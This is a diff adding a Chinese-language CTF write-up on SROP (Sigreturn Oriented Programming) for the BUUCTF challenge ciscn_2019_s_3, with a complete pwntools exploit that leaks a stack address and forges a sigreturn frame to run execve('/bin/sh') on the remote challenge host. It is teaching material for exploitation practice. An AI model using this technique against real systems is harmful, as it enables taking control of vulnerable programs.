@@ -2004,3 +2004,59 @@ SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它�
 * `rdx` = 0 （没有环境变量）
 * `rip` = syscall 指令的地址 （把这些数据提交给内核）
 
+#### 例题 1：ciscn_2019_s_3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
+
+这道题如果以 ret2libc 的思路做几乎和 jarvisoj_level3_x64 差不多，但是没有 `write_got`，都是 `sys_write`，并且附带了一个 `syscall`。
+
+<img width="678" height="252" alt="image" src="https://github.com/user-attachments/assets/e5122b50-4283-43c0-a9db-65719e4f46c7" />
+
+然后看一个 `gadgets()` 函数里有 `mov rax 15`，也就是 `sigreturn`。
+
+<img width="626" height="241" alt="image" src="https://github.com/user-attachments/assets/31441132-783f-41b6-a07a-c7bcb0d6d985" />
+
+`sub_4004E2()` 函数里有 `mov rax 59`，也就是 `execve`。
+
+<img width="586" height="171" alt="image" src="https://github.com/user-attachments/assets/785829cb-5ef8-4c56-b983-3803e09b31aa" />
+
+那么我们就可以用 SROP。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28445
+io = remote(host,port)
+# io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+vuln_addr = 0x4004ed
+syscall = 0x400517
+mov_rax_15_ret = 0x4004da
+
+payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
+# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10
+
+def main():
+    io.sendline(payload_1)
+    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
+    # pause()
+    io.recv(0x20)   # payload_1 + saved_rbp
+    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
+    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
+    frame = SigreturnFrame()
+    frame.rax = 59              # sys_execve
+    frame.rdi = binsh           # 指向 /bin/sh
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall         # 恢复现场后，去执行 syscall
+    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
+    io.sendline(payload_2)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
